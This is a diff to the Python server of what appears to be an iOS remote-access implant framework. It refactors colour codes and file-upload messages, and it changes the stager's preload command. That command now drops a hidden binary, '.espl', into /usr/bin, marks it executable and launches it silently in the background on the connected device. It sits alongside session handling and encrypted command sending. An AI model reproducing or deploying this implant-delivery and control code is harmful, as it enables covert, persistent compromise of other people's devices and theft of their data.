@@ -23,24 +23,15 @@ escrypt = ESEncryptor(shellKey,16)
 sessions = {}
 
 #MARK: UI
-if sys.platform.startswith('win'):
-    RED = ''
-    ENDC = ''
-    UNDERLINE_GREEN = ''
-    GREEN = ''
-    WHITE = ''
-    WHITEBU = ''
-    COLOR_INFO = ''
-    NES= "NES> "
-else:
-    RED = '\033[1;91m'
-    ENDC = '\033[0m'
-    UNDERLINE_GREEN = '\033[4;92m'
-    GREEN = '\033[1;92m'
-    WHITE = '\033[0;97m'
-    WHITEBU = '\033[1;4m'
-    COLOR_INFO = '\033[0;36m'
-    NES = '\033[4;32m'+"NES"+WHITE+"> "
+iswin = sys.platform.startswith('win')
+RED = '' if iswin else '\033[1;91m'
+ENDC = '' if iswin else '\033[0m'
+UNDERLINE_GREEN = '' if iswin else '\033[4;92m'
+GREEN = '' if iswin else '\033[1;92m'
+WHITE = '' if iswin else '\033[0;97m'
+WHITEBU = '' if iswin else '\033[1;4m'
+COLOR_INFO = '' if iswin else '\033[0;36m'
+NES = ('' if iswin else '\033[4;32m')+"NES"+WHITE+"> "
 
 BANNER_ART_TEXT = GREEN+"""
 .---.          .-. .        . .       \\      `.
@@ -312,19 +303,21 @@ def uploadFile(fileName,location,conn):
     
     #size
     filesize = str(sys.getsizeof(fileData))
-    print "Uploading "+fileName
-    print "Size = "+filesize
-    
     #send cmd
     conn.send(encryptStr("installpro "+filesize))
-    
-    #sendfile
-    conn.send(fileData+terminator)
-    conn.recv(1024)
-
+    #check if we are good to go
+    status = receiveString(conn)
+    if status == "1":
+        #sendfile
+        print strinfo("Uploading "+fileName)
+        print strinfo("Size = "+filesize)
+        conn.send(fileData+terminator)
+        #blank
+        conn.recv(1)
+        print strinfo("Finished")
+    else:
+        print strinfo(status)
     #get result
-    print "Finished"
-
 
 def downloadFile(command,conn):
     #send download command
@@ -495,7 +488,6 @@ class SessionHandler:
         hostAddress = addr[0]
         if verbose:
             print strinfo("Connecting to "+hostAddress)
-            print strinfo("Args: "+INSTRUCT_BINARY_ARGUMENT)
         conn.send(INSTRUCT_STAGER)
         CDA = conn.recv(128)
 
@@ -518,8 +510,8 @@ class SessionHandler:
             binaryFile = open("src/binaries/esplios", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-			#fixed problem where user couldn't write to mobile, but now we need root for somethings?
-            preload = "rm /tmp/.espl 2> /dev/null; cat >/tmp/.espl; chmod +x /tmp/.espl; /tmp/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+			#TODO: change upload directory for mobile user
+            preload = "rm /usr/bin/.espl 2> /dev/null; cat >/usr/bin/.espl; chmod +x /usr/bin/.espl; /usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
                 print strinfo("Detected Linux, this isn't supported yet")
